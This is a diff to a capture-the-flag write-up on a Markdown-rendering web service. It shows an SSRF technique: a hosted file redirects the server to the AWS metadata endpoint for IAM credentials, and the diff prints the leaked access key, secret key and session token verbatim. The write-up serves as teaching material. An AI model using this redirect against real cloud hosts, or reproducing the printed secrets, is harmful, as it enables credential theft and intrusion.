@@ -11,6 +11,8 @@ Written by Jules Denardou & Justin Massey, Datadog
 
 *Writeup:*
 
+![](images/web400-1.PNG)
+
 We have provided a service, through which we can query any `.pdf` , `.txt` or `.md` extension. First thing, I found interesting was `.md` extension.
 There has been numerous time in previous CTFs (for instance: Nuit Du Hack's Mark is falling or Confidence CTF 2017). `.md` extensions are used for Markdown files (Like the current writeup you are reading). It could render `#`, `[]()` etc to name few.
 I started investigating that first, and hosted few naughty markdown on my domain, we will call it http://example.com throughout the writeup.
@@ -71,6 +73,8 @@ header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentia
 ```
 
 Now, we submit our http://example.com/exploit/index.md to their webservice. Woot, we leaked the AWS credentials.
+
+![](images/web400-2.PNG)
 
 ```json
 { "Code" : "Success", "LastUpdated" : "2018-11-13T16:19:48Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAS7BJMNVVZRKPTURL", "SecretAccessKey" : "U/SHZlLN6OLQ3AVWgdh2pWZ7lV1FEjKS5nR/wgBC", "Token" : "FQoGZXIvYXdzEOL//////////wEaDOYg2SnsRsw1VaCpSCK3AwYY/Z/TwdhJ9BLPuABqkX0EbzFsrRbChhTfXiEzdoTkLL/i2bEjQTdWjehr2BjiPzD1UhalvvRQqYBX+9sD4qoXmpc7KSCQ3UYZsdTfpRDWzu6KZjUxc8hVLwlHut5kI3d7HIxy3hN9UQkJENGrMRUWDAUbo6evPIHYI7H4gCmUUb7dbAxZGLFK0QCB7pRYiA2ND3Zs68h158Rp5TnLRA+/sH5PAoWctMsavIYt4EPQR3rvzjtvI+IG6uzWJnxi1a+fFZxbTbUTv3OpR/n3b09ZpMjmJxDA1VSzBzA/25/T2aVPMLjnI1LJsAKzQGvY8eyqJBmFAj67llxLXAbHqzVUcrf3jrH1eKP5no2nXsoc9dCXFPPMs3rSLGANk2H+5aYaQzIGWPbnUk4VNWWy3gVqz7+MMxSNi9EwB08dbxmtmEJ+f4gexmqZtGgW+wC9TKhMYhKBqQYNp7o6a7YRCIiJYRCz6K/uBE+J2Lnd4oYEQB/XpWzk4/+2EASIIle1wlHRNXTmKYYd1zCMrphNHtebI81GMAua/AJp9NMfhUZNd67PtPMhXTQ42cmNrm6cp1CsgcGSnpQoxvOr3wU=", "Expiration" : "2018-11-13T22:48:02Z" }
